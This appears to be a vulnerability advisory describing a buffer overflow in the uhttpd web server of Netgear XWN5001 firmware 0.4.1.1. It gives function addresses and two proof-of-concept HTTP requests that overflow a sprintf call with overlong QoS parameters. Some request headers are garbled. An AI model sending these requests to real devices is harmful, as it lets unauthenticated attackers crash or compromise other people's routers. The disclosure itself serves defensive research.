# xwn5001-0.4.1.1
## Firmware version
xwn5001-0.4.1.1

The firmware can be downloaded at https://www.netgear.com/support/product/xwn5001/.
## description
The Netgear xwn5001-0.4.1.1 uhttpd binary has a buffer overflow vulnerability. When a specific network packet is sent to the uhttpd binary, the sprintf operation crashes. This vulnerability can be exploited by a local or remote unauthenticated attacker.
## detail
The vulnerability is located in the function at address 0x43988C of the binary usr/sbin/uhttpd. 

Firstly, parameter plc_qos_port_select is passed to plc_qos_port_select in nvram through nvram_set in function do_setting__2 at 0x431514.

do_setting__2:

![do_setting__2](do_setting__2.png)

Secondly, The parameter qos_port_priority and plc_qos_port passed to sprintf in function plc_qos_port_edit at 0x431070 which is source of the issue.

plc_qos_port_edit:
![plc_qos_port_edit](plc_qos_port_edit.png)



## Send package
Pakcges should be sent in order.
# package1
```txt
GET /apply.cgi?c HTTP/1.1
Host: /cgi-bin/
tamp
Accept: 69
Co
Content-Length: 595

plc_qos_port_select=10&hide2_policy=wzqwzqwzq&submit_flag=plc_qos_dev_port_config
```

# package2
```txt
POST /apply.cgi? tim
Host: /cgi-bin/
C
Accept:
Con
Content-Length: 716

qos_port_priority=11111111111111111111111111111111111111111111111111111111111111111111111111111&plc_qos_port=111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111&%20timestamp=;wzq&submit_flag=plc_qos_port_edit
```
